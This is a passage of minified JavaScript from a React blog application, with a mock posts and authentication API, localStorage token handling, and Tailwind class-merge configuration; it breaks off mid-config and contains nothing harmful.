Network segmentation is fundamental to modern security architecture. Implement it thoughtfully, monitor continuously, and adjust as your threat landscape evolves.
    `,thumbnail:"https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?auto=format&fit=crop&q=80&w=1000",coverImageUrl:"https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?auto=format&fit=crop&q=80&w=1000",author:et[2],authorUsername:et[2].username,authorDisplayName:et[2].displayName,authorAvatarUrl:et[2].avatarUrl,category:pt[0],categoryName:pt[0].name,categorySlug:pt[0].slug,tags:[yn[5],yn[6]],createdAt:"2023-11-28T11:00:00Z",publishedAt:"2023-11-28T11:00:00Z",updatedAt:"2023-11-28T11:00:00Z",viewCount:2245,views:2245,likeCount:134,likesCount:134,commentCount:41,commentsCount:41,isPublished:!0}];let ta=et[1];const _e={defaults:{headers:{common:{}}},interceptors:{request:{use:e=>e({headers:{}})},response:{use:e=>e}},get:async(e,t={})=>{if(console.log(`[MOCK API] GET ${e}`,t),await new Promise(n=>setTimeout(n,300)),e==="/api/posts"){const{page:n=0,size:r=10,category:a,tag:l,search:u}=t.params||{};let f=[...$s];a&&(f=f.filter(E=>E.categorySlug===a||E.category&&E.category.slug===a)),l&&(f=f.filter(E=>E.tags.some(C=>C.slug===l))),u&&(f=f.filter(E=>E.title.toLowerCase().includes(u.toLowerCase())));const h=f.length,m=Math.ceil(h/r),x=n*r,g=x+r;return{data:{content:f.slice(x,g),totalPages:m,totalElements:h,number:n,size:r}}}if(e==="/api/posts/trending"){const{page:n=0,size:r=10}=t.params||{},a=[...$s].sort((x,g)=>(g.views??0)-(x.views??0)),l=a.length,u=Math.ceil(l/r),f=n*r,h=f+r;return{data:{content:a.slice(f,h),totalPages:u,totalElements:l,number:n,size:r}}}if(e==="/api/posts/feed"){const{page:n=0,size:r=10}=t.params||{},a=[...$s],l=a.length,u=Math.ceil(l/r),f=n*r,h=f+r;return{data:{content:a.slice(f,h),totalPages:u,totalElements:l,number:n,size:r}}}if(e.startsWith("/api/posts/slug/")){const n=e.split("/").pop(),r=$s.find(a=>a.slug===n);if(r)return{data:r};throw{response:{status:404}}}if(e.startsWith("/api/categories/slug/")){const n=e.split("/").pop(),r=pt.find(a=>a.slug===n);if(r)return{data:r};throw{response:{status:404}}}if(e==="/api/categories")return{data:pt};if(e==="/api/categories/top")return{data:pt};if(e==="/api/tags"||e==="/api/tags/top")return{data:yn};if(e==="/api/users/top-authors")return{data:et};if(e==="/api/users/me"){if(ta)return{data:ta};throw{response:{status:401}}}if(e.startsWith("/api/users/")){const r=e.replace("/api/users/","").split("/"),a=r[0],l=et.find(u=>u.username===a);if(!l)throw{response:{status:404}};if(r.length===1)return{data:l}}if(e.match(/\/api\/posts\/\d+\/status/)){const n=parseInt(e.split("/")[3]),r=$s.find(a=>a.id===n);return{data:{liked:!1,bookmarked:!1,likesCount:(r==null?void 0:r.likesCount)||0,bookmarksCount:0,commentsCount:(r==null?void 0:r.commentsCount)||0}}}return e.includes("/comments")?{data:[{id:1,content:"Great article! Very informative.",author:et[1],createdAt:"2023-11-20T10:00:00Z"},{id:2,content:"Thanks for sharing this knowledge.",author:et[2],createdAt:"2023-11-21T14:30:00Z"}]}:e.includes("/similar")?{data:{content:[...$s].slice(0,3)}}:e==="/api/notifications"?{data:{content:[],totalPages:0}}:(console.warn(`[MOCK API] Unhandled GET ${e}`),{data:{content:[],totalPages:0}})},post:async(e,t,n)=>(console.log(`[MOCK API] POST ${e}`,t),await new Promise(r=>setTimeout(r,300)),e==="/api/auth/login"?(ta=et[0],{data:{accessToken:"mock-access-token",refreshToken:"mock-refresh-token",userId:ta.id,username:ta.username,email:ta.email,displayName:ta.displayName,role:ta.role}}):e==="/api/auth/register"?{data:{message:"Registered successfully"}}:{data:{success:!0}}),put:async(e,t,n)=>(console.log(`[MOCK API] PUT ${e}`,t),{data:{success:!0}}),delete:async(e,t)=>(console.log(`[MOCK API] DELETE ${e}`),{data:{success:!0}})},sd={register:async e=>{const t=await _e.post("/api/auth/register",e);if(t.data.accessToken){localStorage.setItem("accessToken",t.data.accessToken),localStorage.setItem("refreshToken",t.data.refreshToken);const n={id:t.data.userId,username:t.data.username,email:t.data.email,displayName:t.data.displayName,role:t.data.role};localStorage.setItem("user",JSON.stringify(n))}return t.data},login:async e=>{const t=await _e.post("/api/auth/login",e);if(t.data.accessToken){localStorage.setItem("accessToken",t.data.accessToken),localStorage.setItem("refreshToken",t.data.refreshToken);const n={id:t.data.userId,username:t.data.username,email:t.data.email,displayName:t.data.displayName,role:t.data.role};localStorage.setItem("user",JSON.stringify(n))}return t.data},logout:async()=>{try{await _e.post("/api/auth/logout")}finally{localStorage.removeItem("accessToken"),localStorage.removeItem("refreshToken"),localStorage.removeItem("user")}},getCurrentUser:()=>{const e=localStorage.getItem("user");return e?JSON.parse(e):null},isAuthenticated:()=>!!localStorage.getItem("accessToken")},tk=j.createContext(null),Q4=({children:e})=>{const[t,n]=j.useState(null),[r,a]=j.useState(!0);j.useEffect(()=>{try{const g=sd.getCurrentUser();n(g)}catch(g){console.error("Error loading user:",g),n(null)}finally{a(!1)}},[]);const x={user:t,login:async g=>{const b=await sd.login(g),E={id:b.userId,username:b.username,email:b.email,displayName:b.displayName,role:b.role};return n(E),b},register:async g=>{const b=await sd.register(g),E={id:b.userId,username:b.username,email:b.email,displayName:b.displayName,role:b.role};return n(E),b},logout:async()=>{await sd.logout(),n(null)},updateUser:g=>{n(b=>{const E={...b||{},...g||{}};try{localStorage.setItem("user",JSON.stringify(E))}catch(C){console.error("Failed to update user in localStorage",C)}return E})},setTokensFromOAuth:async(g,b)=>{localStorage.setItem("accessToken",g),localStorage.setItem("refreshToken",b);try{const E=await _e.get("/api/users/me"),C={id:E.data.id,username:E.data.username,email:E.data.email,displayName:E.data.displayName,role:E.data.role,avatarUrl:E.data.avatarUrl};localStorage.setItem("user",JSON.stringify(C)),n(C)}catch(E){console.error("Failed to fetch user after OAuth:",E),localStorage.removeItem("accessToken"),localStorage.removeItem("refreshToken")}},isAuthenticated:!!t,loading:r};return o.jsx(tk.Provider,{value:x,children:e})},Gt=()=>{const e=j.useContext(tk);if(!e)throw new Error("useAuth must be used within AuthProvider");return e},nk=j.createContext();function K4({children:e}){const[t,n]=j.useState(!0);return o.jsx(nk.Provider,{value:{sidebarOpen:t,setSidebarOpen:n},children:e})}function rk(){const e=j.useContext(nk);if(!e)throw new Error("useSidebar must be used within SidebarProvider");return e}const na=({children:e})=>{const{isAuthenticated:t,loading:n}=Gt();return n?o.jsx("div",{className:"flex items-center justify-center min-h-screen",children:o.jsx("div",{className:"text-lg",children:"Loading..."})}):t?e:o.jsx(h4,{to:"/login",replace:!0})};function X4(){const{pathname:e}=Or();return j.useEffect(()=>{window.scrollTo(0,0)},[e]),null}function Wv(e,t){if(typeof e=="function")return e(t);e!=null&&(e.current=t)}function Z4(...e){return t=>{let n=!1;const r=e.map(a=>{const l=Wv(a,t);return!n&&typeof l=="function"&&(n=!0),l});if(n)return()=>{for(let a=0;a<r.length;a++){const l=r[a];typeof l=="function"?l():Wv(e[a],null)}}}}var J4=Symbol.for("react.lazy"),lf=dA[" use ".trim().toString()];function e6(e){return typeof e=="object"&&e!==null&&"then"in e}function ik(e){return e!=null&&typeof e=="object"&&"$$typeof"in e&&e.$$typeof===J4&&"_payload"in e&&e6(e._payload)}function t6(e){const t=r6(e),n=j.forwardRef((r,a)=>{let{children:l,...u}=r;ik(l)&&typeof lf=="function"&&(l=lf(l._payload));const f=j.Children.toArray(l),h=f.find(a6);if(h){const m=h.props.children,x=f.map(g=>g===h?j.Children.count(m)>1?j.Children.only(null):j.isValidElement(m)?m.props.children:null:g);return o.jsx(t,{...u,ref:a,children:j.isValidElement(m)?j.cloneElement(m,void 0,x):null})}return o.jsx(t,{...u,ref:a,children:l})});return n.displayName=`${e}.Slot`,n}var n6=t6("Slot");function r6(e){const t=j.forwardRef((n,r)=>{let{children:a,...l}=n;if(ik(a)&&typeof lf=="function"&&(a=lf(a._payload)),j.isValidElement(a)){const u=l6(a),f=s6(l,a.props);return a.type!==j.Fragment&&(f.ref=r?Z4(r,u):u),j.cloneElement(a,f)}return j.Children.count(a)>1?j.Children.only(null):null});return t.displayName=`${e}.SlotClone`,t}var i6=Symbol("radix.slottable");function a6(e){return j.isValidElement(e)&&typeof e.type=="function"&&"__radixId"in e.type&&e.type.__radixId===i6}function s6(e,t){const n={...t};for(const r in t){const a=e[r],l=t[r];/^on[A-Z]/.test(r)?a&&l?n[r]=(...f)=>{const h=l(...f);return a(...f),h}:a&&(n[r]=a):r==="style"?n[r]={...a,...l}:r==="className"&&(n[r]=[a,l].filter(Boolean).join(" "))}return{...e,...n}}function l6(e){var r,a;let t=(r=Object.getOwnPropertyDescriptor(e.props,"ref"))==null?void 0:r.get,n=t&&"isReactWarning"in t&&t.isReactWarning;return n?e.ref:(t=(a=Object.getOwnPropertyDescriptor(e,"ref"))==null?void 0:a.get,n=t&&"isReactWarning"in t&&t.isReactWarning,n?e.props.ref:e.props.ref||e.ref)}function ak(e){var t,n,r="";if(typeof e=="string"||typeof e=="number")r+=e;else if(typeof e=="object")if(Array.isArray(e)){var a=e.length;for(t=0;t<a;t++)e[t]&&(n=ak(e[t]))&&(r&&(r+=" "),r+=n)}else for(n in e)e[n]&&(r&&(r+=" "),r+=n);return r}function sk(){for(var e,t,n=0,r="",a=arguments.length;n<a;n++)(e=arguments[n])&&(t=ak(e))&&(r&&(r+=" "),r+=t);return r}const qv=e=>typeof e=="boolean"?`${e}`:e===0?"0":e,$v=sk,o6=(e,t)=>n=>{var r;if((t==null?void 0:t.variants)==null)return $v(e,n==null?void 0:n.class,n==null?void 0:n.className);const{variants:a,defaultVariants:l}=t,u=Object.keys(a).map(m=>{const x=n==null?void 0:n[m],g=l==null?void 0:l[m];if(x===null)return null;const b=qv(x)||qv(g);return a[m][b]}),f=n&&Object.entries(n).reduce((m,x)=>{let[g,b]=x;return b===void 0||(m[g]=b),m},{}),h=t==null||(r=t.compoundVariants)===null||r===void 0?void 0:r.reduce((m,x)=>{let{class:g,className:b,...E}=x;return Object.entries(E).every(C=>{let[P,O]=C;return Array.isArray(O)?O.includes({...l,...f}[P]):{...l,...f}[P]===O})?[...m,g,b]:m},[]);return $v(e,u,h,n==null?void 0:n.class,n==null?void 0:n.className)},Wg="-",u6=e=>{const t=d6(e),{conflictingClassGroups:n,conflictingClassGroupModifiers:r}=e;return{getClassGroupId:u=>{const f=u.split(Wg);return f[0]===""&&f.length!==1&&f.shift(),lk(f,t)||c6(u)},getConflictingClassGroupIds:(u,f)=>{const h=n[u]||[];return f&&r[u]?[...h,...r[u]]:h}}},lk=(e,t)=>{var u;if(e.length===0)return t.classGroupId;const n=e[0],r=t.nextPart.get(n),a=r?lk(e.slice(1),r):void 0;if(a)return a;if(t.validators.length===0)return;const l=e.join(Wg);return(u=t.validators.find(({validator:f})=>f(l)))==null?void 0:u.classGroupId},Yv=/^\[(.+)\]$/,c6=e=>{if(Yv.test(e)){const t=Yv.exec(e)[1],n=t==null?void 0:t.substring(0,t.indexOf(":"));if(n)return"arbitrary.."+n}},d6=e=>{const{theme:t,prefix:n}=e,r={nextPart:new Map,validators:[]};return h6(Object.entries(e.classGroups),n).forEach(([l,u])=>{g0(u,r,l,t)}),r},g0=(e,t,n,r)=>{e.forEach(a=>{if(typeof a=="string"){const l=a===""?t:Vv(t,a);l.classGroupId=n;return}if(typeof a=="function"){if(f6(a)){g0(a(r),t,n,r);return}t.validators.push({validator:a,classGroupId:n});return}Object.entries(a).forEach(([l,u])=>{g0(u,Vv(t,l),n,r)})})},Vv=(e,t)=>{let n=e;return t.split(Wg).forEach(r=>{n.nextPart.has(r)||n.nextPart.set(r,{nextPart:new Map,validators:[]}),n=n.nextPart.get(r)}),n},f6=e=>e.isThemeGetter,h6=(e,t)=>t?e.map(([n,r])=>{const a=r.map(l=>typeof l=="string"?t+l:typeof l=="object"?Object.fromEntries(Object.entries(l).map(([u,f])=>[t+u,f])):l);return[n,a]}):e,p6=e=>{if(e<1)return{get:()=>{},set:()=>{}};let t=0,n=new Map,r=new Map;const a=(l,u)=>{n.set(l,u),t++,t>e&&(t=0,r=n,n=new Map)};return{get(l){let u=n.get(l);if(u!==void 0)return u;if((u=r.get(l))!==void 0)return a(l,u),u},set(l,u){n.has(l)?n.set(l,u):a(l,u)}}},ok="!",m6=e=>{const{separator:t,experimentalParseClassName:n}=e,r=t.length===1,a=t[0],l=t.length,u=f=>{const h=[];let m=0,x=0,g;for(let O=0;O<f.length;O++){let N=f[O];if(m===0){if(N===a&&(r||f.slice(O,O+l)===t)){h.push(f.slice(x,O)),x=O+l;continue}if(N==="/"){g=O;continue}}N==="["?m++:N==="]"&&m--}const b=h.length===0?f:f.substring(x),E=b.startsWith(ok),C=E?b.substring(1):b,P=g&&g>x?g-x:void 0;return{modifiers:h,hasImportantModifier:E,baseClassName:C,maybePostfixModifierPosition:P}};return n?f=>n({className:f,parseClassName:u}):u},g6=e=>{if(e.length<=1)return e;const t=[];let n=[];return e.forEach(r=>{r[0]==="["?(t.push(...n.sort(),r),n=[]):n.push(r)}),t.push(...n.sort()),t},x6=e=>({cache:p6(e.cacheSize),parseClassName:m6(e),...u6(e)}),y6=/\s+/,v6=(e,t)=>{const{parseClassName:n,getClassGroupId:r,getConflictingClassGroupIds:a}=t,l=[],u=e.trim().split(y6);let f="";for(let h=u.length-1;h>=0;h-=1){const m=u[h],{modifiers:x,hasImportantModifier:g,baseClassName:b,maybePostfixModifierPosition:E}=n(m);let C=!!E,P=r(C?b.substring(0,E):b);if(!P){if(!C){f=m+(f.length>0?" "+f:f);continue}if(P=r(b),!P){f=m+(f.length>0?" "+f:f);continue}C=!1}const O=g6(x).join(":"),N=g?O+ok:O,T=N+P;if(l.includes(T))continue;l.push(T);const A=a(P,C);for(let _=0;_<A.length;++_){const M=A[_];l.push(N+M)}f=m+(f.length>0?" "+f:f)}return f};function b6(){let e=0,t,n,r="";for(;e<arguments.length;)(t=arguments[e++])&&(n=uk(t))&&(r&&(r+=" "),r+=n);return r}const uk=e=>{if(typeof e=="string")return e;let t,n="";for(let r=0;r<e.length;r++)e[r]&&(t=uk(e[r]))&&(n&&(n+=" "),n+=t);return n};function E6(e,...t){let n,r,a,l=u;function u(h){const m=t.reduce((x,g)=>g(x),e());return n=x6(m),r=n.cache.get,a=n.cache.set,l=f,f(h)}function f(h){const m=r(h);if(m)return m;const x=v6(h,n);return a(h,x),x}return function(){return l(b6.apply(null,arguments))}}const jt=e=>{const t=n=>n[e]||[];return t.isThemeGetter=!0,t},ck=/^\[(?:([a-z-]+):)?(.+)\]$/i,w6=/^\d+\/\d+$/,k6=new Set(["px","full","screen"]),T6=/^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,C6=/\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,S6=/^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/,N6=/^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/,A6=/^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/,wi=e=>ml(e)||k6.has(e)||w6.test(e),ra=e=>Ml(e,"length",O6),ml=e=>!!e&&!Number.isNaN(Number(e)),Zp=e=>Ml(e,"number",ml),Po=e=>!!e&&Number.isInteger(Number(e)),D6=e=>e.endsWith("%")&&ml(e.slice(0,-1)),at=e=>ck.test(e),ia=e=>T6.test(e),L6=new Set(["length","size","percentage"]),_6=e=>Ml(e,L6,dk),I6=e=>Ml(e,"position",dk),P6=new Set(["image","url"]),j6=e=>Ml(e,P6,M6),R6=e=>Ml(e,"",F6),jo=()=>!0,Ml=(e,t,n)=>{const r=ck.exec(e);return r?r[1]?typeof t=="string"?r[1]===t:t.has(r[1]):n(r[2]):!1},O6=e=>C6.test(e)&&!S6.test(e),dk=()=>!1,F6=e=>N6.test(e),M6=e=>A6.test(e),B6=()=>{const e=jt("colors"),t=jt("spacing"),n=jt("blur"),r=jt("brightness"),a=jt("borderColor"),l=jt("borderRadius"),u=jt("borderSpacing"),f=jt("borderWidth"),h=jt("contrast"),m=jt("grayscale"),x=jt("hueRotate"),g=jt("invert"),b=jt("gap"),E=jt("gradientColorStops"),C=jt("gradientColorStopPositions"),P=jt("inset"),O=jt("margin"),N=jt("opacity"),T=jt("padding"),A=jt("saturate"),_=jt("scale"),M=jt("sepia"),R=jt("skew"),B=jt("space"),U=jt("translate"),$=()=>["auto","contain","none"],Y=()=>["auto","hidden","clip","visible","scroll"],ne=()=>["auto",at,t],Z=()=>[at,t],me=()=>["",wi,ra],ye=()=>["auto",ml,at],J=()=>["bottom","center","left","left-bottom","left-top","right","right-bottom","right-top","top"],pe=()=>["solid","dashed","dotted","double","none"],oe=()=>["normal","multiply","screen","overlay","darken","lighten","color-dodge","color-burn","hard-light","soft-light","difference","exclusion","hue","saturation","color","luminosity"],ae=()=>["start","end","center","between","around","evenly","stretch"],xe=()=>["","0",at],q=()=>["auto","avoid","all","avoid-page","page","left","right","column"],We=()=>[ml,at];return{cacheSize:500,separator:":",theme:{colors:[jo],spacing:[wi,ra],blur:["none","",ia,at],brightness:We(),borderColor:[e],borderRadius:["none","","full",ia,at],borderSpacing:Z(),borderWidth:me(),contrast:We(),grayscale:xe(),hueRotate:We(),invert:xe(),gap:Z(),gradientColorStops:[e],gradientColorStopPositions:[D6,ra],inset:ne(),margin:ne(),opacity:We(),padding:Z(),saturate:We(),scale:We(),sepia:xe(),skew:We(),space:Z(),translate:Z()},classGroups:{aspect:[{aspect:["auto","square","video",at]}],container:["container"],columns:[{columns:[ia]}],"break-after":[{"break-after":q()}],"break-before":[{"break-before":q()}],"break-inside":[{"break-inside":["auto","avoid","avoid-page","avoid-column"]}],"box-decoration":[{"box-decoration":["slice","clone"]}],box:[{box:["border","content"]}],display:["block","inline-block","inline","flex","inline-flex","table","inline-table","table-caption","table-cell","table-column","table-column-group","table-footer-group","table-header-group","table-row-group","table-row","flow-root","grid","inline-grid","contents","list-item","hidden"],float:[{float:["right","left","none","start","end"]}],clear:[{clear:["left","right","both","none","start","end"]}],isolation:["isolate","isolation-auto"],"object-fit":[{object:["contain","cover","fill","none","scale-down"]}],"object-position":[{object:[...J(),at]}],overflow:[{overflow:Y()}],"overflow-x":[{"overflow-x":Y()}],"overflow-y":[{"overflow-y":Y()}],overscroll:[{overscroll:$()}],"overscroll-x":[{"overscroll-x":$()}],"overscroll-y":[{"overscroll-y":$()}],position:["static","fixed","absolute","relative","sticky"],inset:[{inset:[P]}],"inset-x":[{"inset-x":[P]}],"inset-y":[{"inset-y":[P]}],start:[{start:[P]}],end:[{end:[P]}],top:[{top:[P]}],right:[{right:[P]}],bottom:[{bottom:[P]}],left:[{left:[P]}],visibility:["visible","invisible","collapse"],z:[{z:["auto",Po,at]}],basis:[{basis:ne()}],"flex-direction":[{flex:["row","row-reverse","col","col-reverse"]}],"flex-wrap":[{flex:["wrap","wrap-reverse","nowrap"]}],flex:[{flex:["1","auto","initial","none",at]}],grow:[{grow:xe()}],shrink:[{shrink:xe()}],order:[{order:["first","last","none",Po,at]}],"grid-cols":[{"grid-cols":[jo]}],"col-start-end":[{col:["auto",{span:["full",Po,at]},at]}],"col-start":[{"col-start":ye()}],"col-end":[{"col-end":ye()}],"grid-rows":[{"grid-rows":[jo]}],"row-start-end":[{row:["auto",{span:[Po,at]},at]}],"row-start":[{"row-start":ye()}],"row-end":[{"row-end":ye()}],"grid-flow":[{"grid-flow":["row","col","dense","row-dense","col-dense"]}],"auto-cols":[{"auto-cols":["auto","min","max","fr",at]}],"auto-rows":[{"auto-rows":["auto","min","max","fr",at]}],gap:[{gap:[b]}],"gap-x":[{"gap-x":[b]}],"gap-y":[{"gap-y":[b]}],"justify-content":[{justify:["normal",...ae()]}],"justify-items":[{"justify-items":["start","end","center","stretch"]}],"justify-self":[{"justify-self":["auto","start","end","center","stretch"]}],"align-content":[{content:["normal",...ae(),"baseline"]}],"align-items":[{items:["start","end","center","baseline","stretch"]}],"align-self":[{self:["auto","start","end","center","stretch","baseline"]}],"place-content":[{"place-content":[...ae(),"baseline"]}],"place-items":[{"place-items":["start","end","center","baseline","stretch"]}],"place-self":[{"place-self":["auto","start","end","center","stretch"]}],p:[{p:[T]}],px:[{px:[T]}],py:[{py:[T]}],ps:[{ps:[T]}],pe:[{pe:[T]}],pt:[{pt:[T]}],pr:[{pr:[T]}],pb:[{pb:[T]}],pl:[{pl:[T]}],m:[{m:[O]}],mx:[{mx:[O]}],my:[{my:[O]}],ms:[{ms:[O]}],me:[{me:[O]}],mt:[{mt:[O]}],mr:[{mr:[O]}],mb:[{mb:[O]}],ml:[{ml:[O]}],"space-x":[{"space-x":[B]}],"space-x-reverse":["space-x-reverse"],"space-y":[{"space-y":[B]}],"space-y-reverse":["space-y-reverse"],w:[{w:["auto","min","max","fit","svw","lvw","dvw",at,t]}],"min-w":[{"min-w":[at,t,"min","max","fit"]}],"max-w":[{"max-w":[at,t,"none","full","min","max","fit","prose",{screen:[ia]},ia]}],h:[{h:[at,t,"auto","min","max","fit","svh","lvh","dvh"]}],"min-h":[{"min-h":[at,t,"min","max","fit","svh","lvh","dvh"]}],"max-h":[{"max-h":[at,t,"min","max","fit","svh","lvh","dvh"]}],size:[{size:[at,t,"auto","min","max","fit"]}],"font-size":[{text:["base",ia,ra]}],"font-smoothing":["antialiased","subpixel-antialiased"],"font-style":["italic","not-italic"],"font-weight":[{font:["thin","extralight","light","normal","medium","semibold","bold","extrabold","black",Zp]}],"font-family":[{font:[jo]}],"fvn-normal":["normal-nums"],"fvn-ordinal":["ordinal"],"fvn-slashed-zero":["slashed-zero"],"fvn-figure":["lining-nums","oldstyle-nums"],"fvn-spacing":["proportional-nums","tabular-nums"],"fvn-fraction":["diagonal-fractions","stacked-fractions"],tracking:[{tracking:["tighter","tight","normal","wide","wider","widest",at]}],"line-clamp":[{"line-clamp":["none",ml,Zp]}],leading:[{leading:["none","tight","snug","normal","relaxed","loose",wi,at]}],"list-image":[{"list-image":["none",at]}],"list-style-type":[{list:["none","disc","decimal",at]}],"list-style-position":[{list:["inside","outside"]}],"placeholder-color":[{placeholder:[e]}],"placeholder-opacity":[{"placeholder-opacity":[N]}],"text-alignment":[{text:["left","center","right","justify","start","end"]}],"text-color":[{text:[e]}],"text-opacity":[{"text-opacity":[N]}],"text-decoration":["underline","overline","line-through","no-underline"],"text-decoration-style":[{decoration:[...pe(),"wavy"]}],"text-decoration-thickness":[{decoration:["auto","from-font",wi,ra]}],"underline-offset":[{"underline-offset":["auto",wi,at]}],"text-decoration-color":[{decoration:[e]}],"text-transform":["uppercase","lowercase","capitalize","normal-case"],"text-overflow":["truncate","text-ellipsis","text-clip"],"text-wrap":[{text:["wrap","nowrap","balance","pretty"]}],indent:[{indent:Z()}],"vertical-align":[{align:["baseline","top","middle","bottom","text-top","text-bottom","sub","super",at]}],whitespace:[{whitespace:["normal","nowrap","pre","pre-line","pre-wrap","break-spaces"]}],break:[{break:["normal","words","all","keep"]}],hyphens:[{hyphens:["none","manual","auto"]}],content:[{content:["none",at]}],"bg-attachment":[{bg:["fixed","local","scroll"]}],"bg-clip":[{"bg-clip":["border","padding","content","text"]}],"bg-opacity":[{"bg-opacity":[N]}],"bg-origin":[{"bg-origin":["border","padding","content"]}],"bg-position":[{bg:[...J(),I6]}],"bg-repeat":[{bg:["no-repeat",{repeat:["","x","y","round","space"]}]}],"bg-size":[{bg:["auto","cover","contain",_6]}],"bg-image":[{bg:["none",{"gradient-to":["t","tr","r","br","b","bl","l","tl"]},j6]}],"bg-color":[{bg:[e]}],"gradient-from-pos":[{from:[C]}],"gradient-via-pos":[{via:[C]}],"gradient-to-pos":[{to:[C]}],"gradient-from":[{from:[E]}],"gradient-via":[{via:[E]}],"gradient-to":[{to:[E]}],rounded:[{rounded:[l]}],"rounded-s":[{"rounded-s":[l]}],"rounded-e":[{"rounded-e":[l]}],"rounded-t":[{"rounded-t":[l]}],"rounded-r":[{"rounded-r":[l]}],"rounded-b":[{"rounded-b":[l]}],"rounded-l":[{"rounded-l":[l]}],"rounded-ss":[{"rounded-ss":[l]}],"rounded-se":[{"rounded-se":[l]}],"rounded-ee":[{"rounded-ee":[l]}],"rounded-es":[{"rounded-es":[l]}],"rounded-tl":[{"rounded-tl":[l]}],"rounded-tr":[{"rounded-tr":[l]}],"rounded-br":[{"rounded-br":[l]}],"rounded-bl":[{"rounded-bl":[l]}],"border-w":[{border:[f]}],"border-w-x":[{"border-x":[f]}],"border-w-y":[{"border-y":[f]}],"border-w-s":[{"border-s":[f]}],"border-w-e":[{"border-e":[f]}],"border-w-t":[{"border-t":[f]}],"border-w-r":[{"border-r":[f]}],"border-w-b":[{"border-b":[f]}],"border-w-l":[{"border-l":[f]}],"border-opacity":[{"border-opacity":[N]}],"border-style":[{border:[...pe(),"hidden"]}],"divide-x":[{"divide-x":[f]}],"divide-x-reverse":["divide-x-reverse"],"divide-y":[{"divide-y":[f]}],"divide-y-reverse":["divide-y-reverse"],"divide-opacity":[{"divide-opacity":[N]}],"divide-style":[{divide:pe()}],"border-color":[{border:[a]}],"border-color-x":[{"border-x":[a]}],"border-color-y":[{"border-y":[a]}],"border-color-s":[{"border-s":[a]}],"border-color-e":[{"border-e":[a]}],"border-color-t":[{"border-t":[a]}],"border-color-r":[{"border-r":[a]}],"border-color-b":[{"border-b":[a]}],"border-color-l":[{"border-l":[a]}],"divide-color":[{divide:[a]}],"outline-style":[{outline:["",...pe()]}],"outline-offset":[{"outline-offset":[wi,at]}],"outline-w":[{outline:[wi,ra]}],"outline-color":[{outline:[e]}],"ring-w":[{ring:me()}],"ring-w-inset":["ring-inset"],"ring-color":[{ring:[e]}],"ring-opacity":[{"ring-opacity":[N]}],"ring-offset-w":[{"ring-offset":[wi,ra]}],"ring-offset-color":[{"ring-offset":[e]}],shadow:[{shadow:["","inner","none",ia,R6]}],"shadow-color":[{shadow:[jo]}],opacity:[{opacity:[N]}],"mix-blend":[{"mix-blend":[...oe(),"plus-lighter","plus-darker"]}],"bg-blend":[{"bg-blend":oe()}],filter:[{filter:["","none"]}],blur:[{blur:[n]}],brightness:[{brightness:[r]}],contrast:[{contrast:[h]}],"drop-shadow":[{"drop-shadow":["","none",ia,at]}],grayscale:[{grayscale:[m]}],"hue-rotate":[{"hue-rotate":[x]}],invert:[{invert:[g]}],saturate:[{saturate:[A]}],sepia:[{sepia:[M]}],"backdrop-filter":[{"backdrop-filter":["","none"]}],"backdrop-blur":[{"backdrop-blur":[n]}],"backdrop-brightness":[{"backdrop-brightness":[r]}],"backdrop-contrast":[{"backdrop-contrast":[h]}],"backdrop-grayscale":[{"backdrop-grayscale":[m]}],"backdrop-hue-rotate":[{"backdrop-hue-rotate":[x]}],"backdrop-invert":[{"backdrop-invert":[g]}],"backdrop-opacity":[{"backdrop-opacity":[N]}],"backdrop-saturate":[{"backdrop-saturate":[A]}],"backdrop-sepia":[{"backdrop-sepia":[M]}],"border-collapse":[{border:["collapse","separate"]}],"border-spacing":[{"border-spacing":[u]}],"border-spacing-x":[{"border-spacing-x":[u]}],"border-spacing-y":[{"border-spacing-y":[u]}],"table-layout":[{table:["auto","fixed"]}],caption:[{caption:["top","bottom"]}],transition:[{transition:["none","all","","colors","opacity","shadow","transform",at]}],duration:[{duration:We()}],ease:[{ease:["linear","in","out","in-out",at]}],delay:[{delay:We()}],animate:[{animate:["none","spin","ping","pulse","bounce",at]}],transform:[{transform:["","gpu","none"]}],scale:[{scale:[_]}],"scale-x":[{"scale-x":[_]}],"scale-y":[{"scale-y":[_]}],rotate:[{rotate:[Po,at]}],"translate-x":[{"translate-x":[U]}],"translate-y":[{"translate-y":[U]}],"skew-x":[{"skew-x":[R]}],"skew-y":[{"skew-y":[R]}],"transform-origin":[{origin:["center","top","top-right","right","bottom-right","bottom","bottom-left","left","top-left",at]}],accent:[{accent:["auto",e]}],appearance:[{appearance:["none","auto"]}],cursor:[{cursor:["auto","default","pointer","wait","text","move","help","not-allowed","none","context-menu","progress","cell","crosshair","vertical-text","alias","copy","no-drop","grab","grabbing","all-scroll","col-resize","row-resize","n-resize","e-resize","s-resize","w-resize","ne-resize","nw-resize","se-resize","sw-resize","ew-resize","ns-resize","nesw-resize","nwse-resize","zoom-in","zoom-out",at]}],"caret-color":[{caret:[e]}],"pointer-events":[{"pointer-events":["none","auto"]}],resize:[{resize:["none","y","x",""]}],"scroll-behavior":[{scroll:["auto","smooth"]}],"scroll-m":[{"scroll-m":Z()}],"scroll-mx":[{"scroll-mx":Z()}],"scroll-my":[{"scroll-my":Z()}],"scroll-ms":[{"scroll-ms":Z()}],"scroll-me":[{"scroll-me":Z()}],"scroll-mt":[{"scroll-mt":Z()}],"scroll-mr":[{"scroll-mr":Z()}],"scroll-mb":[{"scroll-mb":Z()}],"scroll-ml":[{"scroll-ml":Z()}],"scroll-p":[{"scroll-p":Z()}],"scroll-px":[{"scroll-px":Z()}],"scroll-py":[{"scroll-py":Z()}],"scroll-ps":[{"scroll-ps":Z()}],"scroll-pe":[{"scroll-pe":Z()}],"scroll-pt":[{"scroll-pt":Z()}],"scroll-pr":[{"scroll-pr":Z()}],"scroll-pb":[{"scroll-pb":Z()}],"scroll-pl":[{"scroll-pl":Z()}],"snap-align":[{snap:["start","end","center","align-none"]}],"snap-stop":[{snap:["normal","always"]}],"snap-type":[{snap:["none","x","y","both"]}],"snap-strictness":[{snap:["mandatory","proximity"]}],touch:[{touch:["auto","none","manipulation"